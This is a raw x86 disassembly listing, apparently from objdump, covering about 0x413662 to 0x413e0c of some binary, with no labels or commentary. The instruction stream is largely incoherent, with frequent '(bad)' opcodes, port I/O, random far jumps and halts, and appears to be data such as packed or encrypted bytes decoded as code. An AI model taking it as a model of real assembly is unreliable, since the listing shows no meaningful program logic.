  413662:	push   ds
  413663:	inc    ecx
  413664:	pop    edx
  413665:	pop    ecx
  413666:	xchg   BYTE PTR [ecx+ebx*1+0x26ee6478],cl
  41366d:	jecxz  0x4136d0
  41366f:	into   
  413670:	add    eax,0x8cd3c37a
  413675:	sub    BYTE PTR [ecx+edx*8-0xc],0x38
  41367a:	jne    0x41360f
  41367c:	mov    BYTE PTR [esp+eiz*8],0xf6
  413680:	sbb    DWORD PTR [eax],eax
  413682:	dec    edx
  413683:	stc    
  413684:	adc    dl,BYTE PTR [ecx+0x5a87bf3a]
  41368a:	cmc    
  41368b:	jb     0x4136bb
  41368d:	inc    edx
  41368e:	push   ebp
  41368f:	dec    ecx
  413690:	push   0xa09fe0e2
  413695:	cmp    BYTE PTR [ebp-0x64],bl
  413698:	cld    
  413699:	xor    al,0x64
  41369b:	jge    0x4136e6
  41369d:	jae    0x4136f0
  41369f:	loope  0x413653
  4136a1:	rcl    DWORD PTR [ecx-0x43],1
  4136a4:	mov    ah,0x8c
  4136a6:	jns    0x413668
  4136a8:	push   DWORD PTR [eax]
  4136aa:	add    BYTE PTR [eax+0xf58b901],0x8c
  4136b1:	xlat   BYTE PTR ds:[ebx]
  4136b2:	(bad)  
  4136b3:	lahf   
  4136b4:	sti    
  4136b5:	shr    DWORD PTR [ebx],0xfd
  4136b8:	push   edi
  4136b9:	dec    ebx
  4136ba:	pop    ebp
  4136bb:	(bad)  
  4136bc:	mov    ebx,0x5e84a832
  4136c1:	fstp   QWORD PTR [edx]
  4136c3:	mov    esi,0xa416d5a9
  4136c8:	out    0x9e,al
  4136ca:	aad    0x14
  4136cc:	or     DWORD PTR [edx+0x17],ebx
  4136cf:	inc    esp
  4136d0:	mov    ebx,0xd07fb844
  4136d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136d6:	sub    al,0x9a
  4136d8:	adc    eax,0xacc676b4
  4136dd:	adc    eax,0xa5e42f6e
  4136e2:	pop    eax
  4136e3:	jmp    0xc59d:0x13bb7c36
  4136ea:	hlt    
  4136eb:	out    0xb0,eax
  4136ed:	push   es
  4136ee:	call   0xf81c:0xa45e008
  4136f5:	packssdw mm7,QWORD PTR [ecx-0x63768868]
  4136fc:	loope  0x41377c
  4136fe:	push   edx
  4136ff:	loope  0x41377b
  413701:	or     eax,0x4ed148fe
  413706:	ss inc edx
  413708:	aaa    
  413709:	bnd jo 0x413767
  41370c:	scas   al,BYTE PTR es:[edi]
  41370d:	xchg   esp,eax
  41370e:	stos   DWORD PTR es:[di],eax
  413710:	xor    al,0x7c
  413712:	jg     0x41373e
  413714:	inc    eax
  413715:	jg     0x413733
  413717:	popf   
  413718:	xchg   ebx,eax
  413719:	mov    DWORD PTR [ebx],esi
  41371b:	inc    edi
  41371c:	or     al,BYTE PTR [ecx+0x6005745]
  413722:	sub    BYTE PTR [edx-0x6c],ch
  413725:	jle    0x413745
  413727:	add    BYTE PTR [esi-0x785c1881],dl
  41372d:	test   al,0xde
  41372f:	sub    al,0xd4
  413731:	fist   WORD PTR [edx]
  413733:	cmp    DWORD PTR [ecx+0x4cc918b3],0x32
  41373a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41373b:	dec    edi
  41373c:	mov    DWORD PTR [ebp-0x68],0xb2923a4
  413743:	jb     0x4137bb
  413745:	jns    0x413783
  413747:	sahf   
  413748:	clc    
  413749:	aaa    
  41374a:	fisttp DWORD PTR ds:0x744e28e0
  413750:	pop    ebx
  413751:	jmp    0x742c:0x6f907e4f
  413758:	in     al,dx
  413759:	mov    bh,BYTE PTR [esi+0x54]
  41375c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41375d:	xchg   ecx,eax
  41375e:	jae    0x413760
  413760:	push   ds
  413761:	xchg   al,bh
  413763:	sbb    eax,0x61dd4c7c
  413768:	push   ebx
  413769:	or     eax,0x853b469c
  41376e:	xor    eax,0x5fd0c14e
  413773:	jmp    0xa51e:0xde0760f8
  41377a:	je     0x413732
  41377c:	hlt    
  41377d:	add    bl,bl
  41377f:	outs   dx,DWORD PTR ds:[esi]
  413780:	pop    edx
  413781:	aas    
  413782:	stos   BYTE PTR es:[edi],al
  413783:	lahf   
  413784:	stc    
  413785:	rcl    ebp,cl
  413787:	xchg   ecx,eax
  413788:	shl    BYTE PTR [edi+0x54],cl
  41378b:	clc    
  41378c:	dec    eax
  41378d:	int3   
  41378e:	push   esi
  41378f:	xor    esp,DWORD PTR [edx]
  413791:	xor    al,0xac
  413793:	and    BYTE PTR [edx+0x21533b5f],bl
  413799:	fisub  WORD PTR [edi+0x19]
  41379c:	xchg   ebp,eax
  41379d:	std    
  41379e:	lock mov bl,BYTE PTR ss:[esi]
  4137a2:	ret    
  4137a3:	mov    ecx,0x41e68166
  4137a8:	xor    eax,0x27a1f3df
  4137ad:	popa   
  4137ae:	shr    BYTE PTR [eax+0x6b],0x58
  4137b2:	push   ecx
  4137b3:	dec    edi
  4137b4:	es das 
  4137b6:	clc    
  4137b7:	or     DWORD PTR [ecx+0x78],esi
  4137ba:	out    0x9c,al
  4137bc:	inc    eax
  4137bd:	xor    edi,ebp
  4137bf:	and    DWORD PTR [esi+eiz*2],edx
  4137c2:	gs jae 0x413831
  4137c5:	mov    al,0xca
  4137c7:	stc    
  4137c8:	lahf   
  4137c9:	jle    0x413783
  4137cb:	pop    es
  4137cc:	stc    
  4137cd:	bound  ebx,QWORD PTR [eax-0x79]
  4137d0:	loop   0x41380b
  4137d2:	test   DWORD PTR [eax],ebx
  4137d4:	pop    ss
  4137d5:	push   esp
  4137d6:	xor    dl,ch
  4137d8:	dec    ecx
  4137d9:	xor    dh,BYTE PTR [edx]
  4137db:	mov    BYTE PTR [edi],ch
  4137dd:	xchg   edx,eax
  4137de:	and    eax,0xde84f8b2
  4137e3:	mov    BYTE PTR [ecx+0x29],dl
  4137e6:	(bad)  
  4137e7:	xchg   ebp,eax
  4137e8:	fcos   
  4137ea:	jle    0x413840
  4137ec:	lods   eax,DWORD PTR ds:[esi]
  4137ed:	pop    esp
  4137ee:	sub    al,0xad
  4137f0:	fadd   QWORD PTR [eax+eax*8+0x241d78ee]
  4137f7:	xchg   edi,eax
  4137f8:	and    al,0xe9
  4137fa:	(bad)  
  4137fb:	or     ebp,ebp
  4137fd:	outs   dx,DWORD PTR ds:[esi]
  4137fe:	gs xor al,0xf7
  413801:	xchg   esp,eax
  413802:	test   eax,0xe8c8cfc8
  413807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413808:	gs mov eax,0x578fdeec
  41380e:	mov    dl,0xb0
  413810:	inc    esp
  413811:	jo     0x4137a0
  413813:	sbb    BYTE PTR [ebp*2+0x48ff5bed],dh
  41381a:	popf   
  41381b:	sub    edx,edi
  41381d:	addr16 loope 0x41385b
  413820:	adc    al,0x4
  413822:	hlt    
  413823:	aas    
  413824:	pop    DWORD PTR [esp+esi*1+0x304ce6b6]
  41382b:	sahf   
  41382c:	jp     0x413863
  41382e:	sub    edi,ebx
  413830:	scas   al,BYTE PTR es:[edi]
  413831:	das    
  413832:	enter  0xa1ca,0xe5
  413836:	out    0xde,al
  413838:	xchg   BYTE PTR [esi],dl
  41383a:	rol    BYTE PTR [edi-0x6e71efcb],cl
  413840:	mov    BYTE PTR ds:0x2c6df8df,bh
  413846:	loop   0x413861
  413848:	and    eax,DWORD PTR [ebx]
  41384a:	cld    
  41384b:	(bad)  
  41384c:	mov    ebx,0xbcb5b549
  413851:	jae    0x413890
  413853:	pop    ebp
  413854:	sbb    ebp,ecx
  413856:	xor    eax,0xaaefa815
  41385b:	adc    BYTE PTR [ecx],0x59
  41385e:	jl     0x4138c4
  413860:	(bad)
  413863:	mov    eax,ds:0x9417337a
  413868:	test   ch,dh
  41386a:	sub    al,0x67
  41386c:	xchg   ebp,eax
  41386d:	pop    es
  41386e:	popa   
  41386f:	mov    edi,0xb090194c
  413874:	dec    ebp
  413875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413876:	cmp    eax,0xce561654
  41387b:	sar    DWORD PTR [ebx+0x2854879d],cl
  413881:	add    BYTE PTR [edx+0x2ef30d63],0x42
  413888:	rol    DWORD PTR [edi+0x9],cl
  41388b:	ror    BYTE PTR [eax+ebp*1+0x3ed279a2],1
  413892:	mov    esi,DWORD PTR [esi+0x3a]
  413895:	mov    bl,0x77
  413897:	inc    ecx
  413898:	not    edi
  41389a:	sti    
  41389b:	pop    eax
  41389c:	mov    al,ds:0xda10ad42
  4138a1:	call   0x34529629
  4138a6:	scas   eax,DWORD PTR es:[edi]
  4138a7:	lock (bad) 
  4138a9:	mov    ecx,0x90bd76b2
  4138ae:	pop    esp
  4138af:	inc    edx
  4138b0:	jbe    0x4138b5
  4138b2:	dec    ecx
  4138b3:	xor    eax,0xaa28845f
  4138b8:	inc    esp
  4138b9:	cmp    edx,eax
  4138bb:	push   edx
  4138bc:	and    BYTE PTR [ecx],cl
  4138be:	(bad)  
  4138bf:	push   es
  4138c0:	lock cmp DWORD PTR [edx-0x2151a274],ebp
  4138c7:	jecxz  0x4138c7
  4138c9:	aaa    
  4138ca:	ja     0x413943
  4138cc:	jl     0x4138ee
  4138ce:	mov    ds:0x33769a53,al
  4138d3:	mov    ds:0x4a24ebd7,al
  4138d8:	repz fwait
  4138da:	stc    
  4138db:	daa    
  4138dc:	jbe    0x4138c2
  4138de:	pop    edx
  4138df:	iret   
  4138e0:	fcom   DWORD PTR [eax-0x3e]
  4138e3:	cmp    BYTE PTR [esi-0x5be6e114],bh
  4138e9:	sub    esp,0x3d
  4138ec:	in     al,dx
  4138ed:	bound  esi,QWORD PTR [ebp+0x44]
  4138f0:	(bad)  
  4138f1:	ins    DWORD PTR es:[edi],dx
  4138f2:	push   0x65
  4138f4:	cs mov bl,0x46
  4138f7:	retf   0x13ce
  4138fa:	mov    ebp,0x95ffde8f
  4138ff:	sbb    DWORD PTR [edx],0xffffffda
  413902:	adc    ebx,DWORD PTR [edi+0x45]
  413905:	cmp    bh,al
  413907:	(bad)  
  413908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413909:	(bad)  
  41390a:	int3   
  41390b:	into   
  41390c:	into   
  41390d:	jns    0x4138fa
  41390f:	pop    edi
  413910:	inc    esi
  413911:	sub    al,0x1e
  413913:	sub    BYTE PTR [edi-0x708b99e6],dl
  413919:	int3   
  41391a:	ss pop edx
  41391c:	fmul   st(5),st
  41391e:	push   0x78
  413920:	in     eax,0xa5
  413922:	jo     0x4138ac
  413924:	enter  0xf126,0x3e
  413928:	sub    eax,0x41e56e34
  41392d:	jg     0x413985
  41392f:	inc    ebp
  413930:	scas   al,BYTE PTR es:[edi]
  413931:	imul   eax,esp,0xffffffd9
  413934:	sbb    al,0xac
  413936:	inc    edx
  413937:	cli    
  413938:	(bad)  
  413939:	popa   
  41393a:	retf   0xfc25
  41393d:	and    eax,0xb8ea3fc7
  413942:	mov    ecx,0xcfe78cf1
  413947:	push   eax
  413948:	mov    ebx,0x2ac3da93
  41394d:	jns    0x413909
  41394f:	scas   eax,DWORD PTR es:[edi]
  413950:	sbb    bh,al
  413952:	xchg   ebp,eax
  413953:	into   
  413954:	scas   al,BYTE PTR es:[edi]
  413955:	cmp    al,0x69
  413957:	dec    esi
  413958:	jmp    0xb6b3:0x55ceb286
  41395f:	lea    ebp,[ebx+0xa]
  413962:	push   edi
  413963:	test   BYTE PTR [edx-0x6d4033dc],0x77
  41396a:	sub    BYTE PTR [edx+0x29995934],cl
  413970:	lock scas al,BYTE PTR es:[edi]
  413972:	imul   BYTE PTR [esi+0x26563cf8]
  413978:	add    BYTE PTR [esi-0x60],al
  41397b:	push   ebx
  41397c:	pusha  
  41397d:	fisub  WORD PTR [esi-0x70]
  413980:	add    al,0xfb
  413982:	dec    esp
  413983:	fdivp  st(4),st
  413985:	popf   
  413986:	in     al,0x9d
  413988:	dec    esi
  413989:	dec    eax
  41398a:	add    BYTE PTR [ebx-0x750606a2],0xf6
  413991:	add    edi,DWORD PTR [ebp-0x1d]
  413994:	dec    eax
  413995:	jne    0x4139ca
  413997:	lahf   
  413998:	jno    0x4139ff
  41399a:	fidivr DWORD PTR [edx]
  41399c:	rcr    dh,0xa3
  41399f:	idiv   DWORD PTR [esi-0x543791ec]
  4139a5:	sar    BYTE PTR [esi+eiz*2],cl
  4139a8:	cmp    dl,al
  4139aa:	mov    esp,0x77864bbf
  4139af:	add    al,0xd6
  4139b1:	pushf  
  4139b2:	rcl    DWORD PTR [ecx+esi*1-0x5],1
  4139b6:	outs   dx,DWORD PTR ds:[esi]
  4139b7:	jg     0x4139e8
  4139b9:	sbb    al,0x49
  4139bb:	adc    eax,0x2158ed02
  4139c0:	(bad)  
  4139c1:	fdivr  QWORD PTR [edx+edi*1]
  4139c4:	adc    ch,BYTE PTR [eax-0x556323f5]
  4139ca:	popf   
  4139cb:	or     al,0xbd
  4139cd:	adc    esp,0x33cfaf4
  4139d3:	repz loopne 0x4139a4
  4139d6:	daa    
  4139d7:	push   ebp
  4139d8:	cwde   
  4139d9:	imul   edx
  4139db:	mov    dh,0x5c
  4139dd:	enterw 0x416f,0xc5
  4139e2:	es xchg ebp,eax
  4139e4:	inc    ebx
  4139e5:	mov    DWORD PTR [ecx+0x457f4c23],ebp
  4139eb:	shl    BYTE PTR [edx+ebp*8-0xe],cl
  4139ef:	dec    edx
  4139f0:	(bad)  
  4139f1:	cld    
  4139f2:	bound  edi,QWORD PTR [ebp-0x58]
  4139f5:	daa    
  4139f6:	iret   
  4139f7:	push   es
  4139f8:	pop    ss
  4139f9:	cmp    DWORD PTR [edi],0xd3145efe
  4139ff:	push   cs
  413a00:	sub    edx,DWORD PTR [edi-0x300d163e]
  413a06:	mov    ebp,0xcd8eb0a4
  413a0b:	mov    eax,ds:0xc0ddb9d3
  413a10:	daa    
  413a11:	aaa    
  413a12:	ds pop es
  413a14:	ficom  WORD PTR gs:[ebx+0x4268a347]
  413a1b:	shl    BYTE PTR [edx-0x2473074f],0x58
  413a22:	lahf   
  413a23:	aad    0xa6
  413a25:	daa    
  413a26:	and    bl,dh
  413a28:	add    eax,0xa586c543
  413a2d:	cmova  ebp,DWORD PTR [edx]
  413a30:	add    ah,BYTE PTR [eax+edi*1+0x2e]
  413a34:	pop    ecx
  413a35:	nop
  413a36:	repnz mov esp,0x38821e20
  413a3c:	dec    ebp
  413a3d:	mov    edi,0x6bcf5d63
  413a42:	ja     0x413aa6
  413a44:	ret    
  413a45:	push   ebx
  413a46:	js     0x413a73
  413a48:	xchg   eax,ebx
  413a4a:	jmp    0xb974:0x2bf4c499
  413a51:	scas   eax,DWORD PTR es:[edi]
  413a52:	ret    0x272c
  413a55:	sub    edi,DWORD PTR [eax-0x27]
  413a58:	mov    bl,0x64
  413a5a:	test   cl,ch
  413a5c:	and    ch,ah
  413a5e:	or     ebx,ebp
  413a60:	daa    
  413a61:	fiadd  DWORD PTR [ebx*1+0x518b1379]
  413a68:	sub    bl,dh
  413a6a:	daa    
  413a6b:	mov    ?,WORD PTR [edi+0x69]
  413a6e:	xchg   ecx,eax
  413a6f:	stos   BYTE PTR es:[edi],al
  413a70:	(bad)  
  413a71:	loop   0x413a8a
  413a73:	shl    DWORD PTR [edx],1
  413a75:	or     DWORD PTR [esi-0x48],ebx
  413a78:	fstp   st(2)
  413a7a:	dec    edx
  413a7b:	int3   
  413a7c:	sub    BYTE PTR [edi],dl
  413a7e:	pop    edi
  413a80:	push   esi
  413a81:	fwait
  413a82:	addr16 repnz mov fs,ebx
  413a86:	add    BYTE PTR [esp+ebp*8+0x460abf46],0xe0
  413a8e:	fld    TBYTE PTR fs:[ecx+0x4e]
  413a92:	lahf   
  413a93:	mov    edi,0xce2ba99a
  413a98:	push   ss
  413a99:	jle    0x413a23
  413a9b:	jb     0x413a4e
  413a9d:	mul    DWORD PTR ds:0x35f54443
  413aa3:	mov    eax,0x4d671b6a
  413aa8:	xchg   edi,eax
  413aa9:	pop    ds
  413aaa:	mov    bl,0x0
  413aac:	sti    
  413aad:	cwde   
  413aae:	outs   dx,BYTE PTR ds:[si]
  413ab0:	ficomp WORD PTR [ecx-0x179e1f52]
  413ab6:	(bad)  
  413ab7:	jmp    0x413ae8
  413ab9:	adc    al,0x27
  413abb:	sub    esp,DWORD PTR [esi-0xf4325f4]
  413ac1:	out    0x70,al
  413ac3:	into   
  413ac4:	pushf  
  413ac5:	iret   
  413ac6:	xchg   ebx,eax
  413ac7:	add    ebx,DWORD PTR [edx+0x71]
  413aca:	xchg   ebp,eax
  413acb:	or     DWORD PTR [ecx],ebp
  413acd:	fwait
  413ace:	inc    esp
  413acf:	out    dx,al
  413ad0:	add    ecx,eax
  413ad2:	jmp    0xd52c:0xf01f0c0e
  413ad9:	daa    
  413ada:	dec    edx
  413adb:	push   ebx
  413adc:	(bad)  
  413add:	inc    DWORD PTR [eax+eax*4]
  413ae0:	ror    BYTE PTR [ebx+0x3a3e3ed9],0x5b
  413ae7:	pop    esp
  413ae8:	xor    bh,BYTE PTR [ecx-0x36]
  413aeb:	test   eax,0xcfd91fbd
  413af0:	imul   ecx
  413af2:	push   ebp
  413af3:	cmp    eax,0x9d167c22
  413af8:	bound  eax,QWORD PTR ds:0x6d781e2c
  413afe:	aas    
  413aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b00:	test   al,0xc0
  413b02:	and    dl,dh
  413b04:	pop    ds
  413b05:	inc    ecx
  413b06:	xor    al,0x86
  413b08:	test   BYTE PTR [eax+0x5fd2bb35],cl
  413b0e:	cld    
  413b0f:	fist   WORD PTR [esp+ecx*4]
  413b12:	out    0x99,eax
  413b14:	sub    al,BYTE PTR [eax]
  413b16:	inc    edi
  413b17:	lea    esi,[eax-0x64]
  413b1a:	shl    DWORD PTR [eax-0xd8150a8],0xc2
  413b21:	sahf   
  413b22:	bound  edi,QWORD PTR [edi]
  413b24:	out    0x61,eax
  413b26:	xor    edi,DWORD PTR [ecx-0x25e08615]
  413b2c:	adc    ah,BYTE PTR [edi]
  413b2e:	mov    DWORD PTR [ebp+0xe],edx
  413b31:	mov    al,0xe2
  413b33:	mov    ds:0xe303e1fc,al
  413b38:	test   eax,eax
  413b3a:	adc    al,0xde
  413b3c:	push   ebx
  413b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b3e:	dec    edx
  413b3f:	pop    ebx
  413b40:	mov    BYTE PTR [ebp+0xf0f9c0d],bl
  413b46:	aad    0x5d
  413b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b49:	fs sub al,0xf2
  413b4c:	loope  0x413b64
  413b4e:	popf   
  413b4f:	fmul   DWORD PTR ss:[eax-0x2757c6b2]
  413b56:	pop    edi
  413b57:	test   eax,0xd0384bff
  413b5c:	cmp    eax,0x51b3aa26
  413b61:	jns    0x413b5d
  413b63:	(bad)  
  413b64:	fdivr  DWORD PTR [ebp-0x39]
  413b67:	mov    ebp,DWORD PTR [ecx]
  413b69:	cmp    al,0x81
  413b6b:	pop    eax
  413b6c:	inc    ebp
  413b6d:	jnp    0x413b1c
  413b6f:	mov    cl,0xcc
  413b71:	hlt    
  413b72:	sbb    edi,DWORD PTR cs:[esi-0x15]
  413b76:	addr16 push es
  413b78:	mov    eax,0x30880760
  413b7d:	std    
  413b7e:	int3   
  413b7f:	sar    DWORD PTR [ebx+ecx*1+0x51],cl
  413b83:	loop   0x413ba5
  413b85:	mov    bh,0x8a
  413b87:	dec    ecx
  413b88:	cld    
  413b89:	in     eax,0x4b
  413b8b:	mov    DWORD PTR [ebp+0x5d],ecx
  413b8e:	jg     0x413b64
  413b90:	jmp    0x4002d0e0
  413b95:	enter  0x7f0b,0x31
  413b99:	(bad)  
  413b9a:	adc    eax,0xee4e2939
  413b9f:	sbb    ecx,ecx
  413ba1:	call   0x73dc:0x728b04f2
  413ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ba9:	mov    ebp,0x6053f71c
  413bae:	fldenv [edi+edx*1]
  413bb1:	or     DWORD PTR [eax],ebx
  413bb3:	dec    ebx
  413bb4:	xchg   BYTE PTR [esp+ebx*2-0xa],ch
  413bb8:	sub    eax,0x9164bbbb
  413bbd:	shl    BYTE PTR [eax+0x14],1
  413bc0:	xchg   edi,eax
  413bc1:	add    cl,al
  413bc3:	out    dx,eax
  413bc4:	jb     0x413c1c
  413bc6:	adc    cl,BYTE PTR [ebp-0x605119de]
  413bcc:	jb     0x413ba7
  413bce:	mov    WORD PTR [eax+0x242b9291],fs
  413bd4:	dec    ebx
  413bd5:	fs call 0x11a007bf
  413bdb:	gs das 
  413bdd:	xor    DWORD PTR [edi+0x2c],ebp
  413be0:	js     0x413bdb
  413be2:	push   ebx
  413be3:	out    0x56,al
  413be5:	shr    BYTE PTR [eax-0x3ec565a3],cl
  413beb:	cs retf 
  413bed:	pop    esi
  413bee:	inc    BYTE PTR es:[edi-0x1a]
  413bf2:	xchg   BYTE PTR [eax+eiz*2],ah
  413bf5:	adc    DWORD PTR [eax+0xf],edi
  413bf8:	sub    edi,DWORD PTR [ebx-0x705137ac]
  413bfe:	mov    cl,0x5b
  413c00:	outs   dx,BYTE PTR ds:[esi]
  413c01:	(bad)  
  413c03:	mov    edi,0x9c5e18cc
  413c08:	call   0x805ae5df
  413c0d:	stos   DWORD PTR es:[edi],eax
  413c0e:	mov    ds:0xd8e12d1f,eax
  413c13:	inc    esi
  413c14:	mov    ecx,0x516f34b7
  413c19:	sbb    DWORD PTR [edx],edi
  413c1b:	sbb    al,0x7f
  413c1d:	mov    ?,WORD PTR [eax-0x3e82f1c2]
  413c23:	jp     0x413ca0
  413c25:	lds    eax,FWORD PTR [ebp-0x1]
  413c28:	fcmovb st,st(5)
  413c2a:	sub    BYTE PTR [edx],bl
  413c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c2d:	sbb    eax,0xef972510
  413c32:	ins    DWORD PTR es:[edi],dx
  413c33:	or     DWORD PTR [edx-0x7d],eax
  413c36:	ds leave 
  413c38:	jl     0x413c90
  413c3a:	fwait
  413c3b:	cmp    al,0x86
  413c3d:	pop    eax
  413c3e:	out    dx,eax
  413c3f:	out    dx,eax
  413c40:	stos   BYTE PTR es:[edi],al
  413c41:	fs (bad) 
  413c43:	jno    0x413c2b
  413c45:	cdq    
  413c46:	retf   
  413c47:	push   ebp
  413c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c49:	lea    ecx,[esi]
  413c4b:	add    edx,esi
  413c4d:	and    eax,0x3d8961b0
  413c52:	pop    eax
  413c53:	test   eax,0xdafc6240
  413c58:	inc    ebx
  413c59:	lahf   
  413c5a:	jnp    0x413cc9
  413c5c:	push   ecx
  413c5d:	dec    DWORD PTR [ecx-0x5127687]
  413c63:	je     0x413cd7
  413c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c66:	in     al,0x44
  413c68:	test   al,0xdc
  413c6a:	pop    es
  413c6b:	fs xchg ebp,eax
  413c6d:	and    al,0x9a
  413c6f:	hlt    
  413c70:	lahf   
  413c71:	repnz or bl,BYTE PTR [esp+ebx*4+0x76]
  413c76:	or     al,0x13
  413c78:	out    0x74,al
  413c7a:	in     eax,dx
  413c7b:	aad    0x9b
  413c7d:	lods   al,BYTE PTR ds:[esi]
  413c7e:	loope  0x413c1b
  413c80:	xor    ch,BYTE PTR [edx-0x701dcaa0]
  413c86:	test   eax,0xc1da8a04
  413c8b:	fcomp  DWORD PTR [esi-0x53]
  413c8e:	bound  ecx,QWORD PTR [edx-0x1f]
  413c91:	xor    eax,0xda2fd973
  413c96:	(bad)  
  413c97:	mov    ecx,DWORD PTR [ecx+ecx*4]
  413c9a:	mov    ah,0xce
  413c9c:	add    dl,dh
  413c9e:	fisub  WORD PTR [ecx]
  413ca0:	shl    BYTE PTR [ebp-0x741bcb12],0xc4
  413ca7:	jmp    0x413d15
  413ca9:	inc    esp
  413caa:	fistp  WORD PTR [edx-0x80]
  413cad:	outs   dx,BYTE PTR ds:[esi]
  413cae:	push   ebp
  413caf:	std    
  413cb0:	mov    cx,0x2d8
  413cb4:	mov    bh,0x78
  413cb6:	mov    edi,0x8207e6b4
  413cbb:	ins    DWORD PTR es:[edi],dx
  413cbc:	pop    ds
  413cbd:	(bad)  
  413cbe:	and    bh,ah
  413cc0:	dec    edx
  413cc1:	loope  0x413d21
  413cc3:	fist   WORD PTR [ebx-0x64]
  413cc6:	hlt    
  413cc7:	cli    
  413cc8:	inc    ebp
  413cc9:	push   ebx
  413cca:	push   esi
  413ccb:	jnp    0x413cb6
  413ccd:	outs   dx,BYTE PTR ds:[esi]
  413cce:	inc    esi
  413ccf:	sbb    BYTE PTR [edx],bl
  413cd1:	inc    ebx
  413cd2:	shr    BYTE PTR [edi+eax*8],1
  413cd5:	leave  
  413cd6:	inc    esp
  413cd7:	cdq    
  413cd8:	xchg   edi,eax
  413cd9:	xor    ah,cl
  413cdb:	sahf   
  413cdc:	pop    ds
  413cdd:	rol    DWORD PTR [ebx+0x1adc1d90],0x33
  413ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ce5:	pop    edi
  413ce6:	jle    0x413cce
  413ce8:	jno    0x413c84
  413cea:	and    eax,0xf3ac29a2
  413cef:	fmul   st,st(3)
  413cf1:	push   0x22e4e037
  413cf6:	pop    ebx
  413cf7:	jmp    DWORD PTR [edi-0x43]
  413cfa:	icebp  
  413cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cfc:	test   DWORD PTR [edx],esi
  413cfe:	mov    cl,0xc5
  413d00:	and    DWORD PTR [esi+0xcdc8e30],ebp
  413d06:	add    ebp,DWORD PTR [ebx-0x54f584d2]
  413d0c:	add    dh,0x7b
  413d0f:	clc    
  413d10:	int    0x3
  413d12:	cld    
  413d13:	adc    BYTE PTR [ebx+0x6afcc942],dh
  413d19:	inc    eax
  413d1a:	and    bl,BYTE PTR [ecx+0x78]
  413d1d:	add    eax,0xd7facb27
  413d22:	lods   eax,DWORD PTR ds:[esi]
  413d23:	outs   dx,DWORD PTR ds:[esi]
  413d24:	jb     0x413d66
  413d26:	add    edi,esi
  413d28:	dec    ebx
  413d29:	scas   eax,DWORD PTR es:[edi]
  413d2a:	mov    ds:0x94369c25,eax
  413d2f:	je     0x413da6
  413d31:	outs   dx,DWORD PTR ds:[esi]
  413d32:	shl    DWORD PTR [eax-0x33],1
  413d35:	mov    ah,0x65
  413d37:	(bad)  
  413d38:	out    0xf8,al
  413d3a:	jl     0x413cea
  413d3c:	sub    al,0xd9
  413d3e:	pop    ebx
  413d3f:	and    eax,0x41b3fe19
  413d44:	or     eax,DWORD PTR [ebx-0x59]
  413d47:	mov    esi,0x7ac2f26f
  413d4c:	out    dx,eax
  413d4d:	dec    edx
  413d4e:	ja     0x413cf4
  413d50:	lds    esp,FWORD PTR [ebx-0x4f]
  413d53:	xor    al,dh
  413d55:	push   eax
  413d56:	lahf   
  413d57:	jmp    0x675e:0x4e8b25b9
  413d5e:	mov    edx,0x8e7aaea2
  413d63:	and    BYTE PTR [edx+0x3a60477f],dl
  413d69:	jnp    0x413d2b
  413d6b:	dec    esp
  413d6c:	fucom  st(4)
  413d6e:	cdq    
  413d6f:	mov    WORD PTR [ecx],gs
  413d71:	hlt    
  413d72:	shr    DWORD PTR [esi],0xed
  413d75:	(bad)  
  413d76:	in     eax,0x90
  413d78:	call   0x7a93e9f5
  413d7d:	adc    ebx,DWORD PTR [edi]
  413d7f:	mov    ds:0xf6415284,al
  413d84:	mov    bh,BYTE PTR [ecx]
  413d86:	and    al,0xf0
  413d88:	loope  0x413d59
  413d8a:	das    
  413d8b:	test   eax,0xf04135c0
  413d90:	bound  eax,QWORD PTR [ebx-0x7a]
  413d93:	xor    ebp,DWORD PTR [esi]
  413d95:	nop
  413d96:	data16 jno 0x413dc7
  413d99:	ins    DWORD PTR es:[edi],dx
  413d9a:	les    ecx,FWORD PTR [ebp+0x56]
  413d9d:	dec    edx
  413d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d9f:	mov    eax,ds:0xaedd05ef
  413da4:	out    0x2f,al
  413da6:	jae    0x413dd2
  413da8:	mov    edi,0x9e8808a2
  413dad:	pop    esp
  413dae:	jnp    0x413e13
  413db0:	xchg   edx,eax
  413db1:	hlt    
  413db2:	ds cwde 
  413db4:	mov    dl,0x24
  413db6:	dec    esp
  413db7:	ja     0x413d3f
  413db9:	nop
  413dba:	or     eax,0x82b2b6ad
  413dbf:	lahf   
  413dc0:	xor    esp,DWORD PTR [ebx+eiz*8-0x61]
  413dc4:	inc    BYTE PTR [esi+0x1c989a04]
  413dca:	(bad)
  413dcd:	faddp  st(6),st
  413dcf:	push   esp
  413dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dd1:	adc    ebx,eax
  413dd3:	fwait
  413dd4:	retf   
  413dd5:	push   edi
  413dd6:	adc    al,0x87
  413dd8:	pop    esi
  413dd9:	popf   
  413dda:	and    eax,0x78e9a7fb
  413ddf:	xchg   edx,eax
  413de0:	cmp    al,0x9b
  413de2:	ret    0xf461
  413de5:	xor    eax,0x3142213b
  413dea:	pop    edi
  413deb:	fwait
  413dec:	clc    
  413ded:	into   
  413dee:	jg     0x413e58
  413df0:	mov    dh,0x1f
  413df2:	test   DWORD PTR [eax-0x1fc6a6f7],ecx
  413df8:	ins    DWORD PTR es:[edi],dx
  413df9:	shl    BYTE PTR [ecx-0x147bcbd],0x6b
  413e00:	xchg   edx,eax
  413e01:	and    DWORD PTR [ebx+0x484dd20e],0xcf54bf02
  413e0b:	pop    ecx
  413e0c:	jmp    0x157f8e73
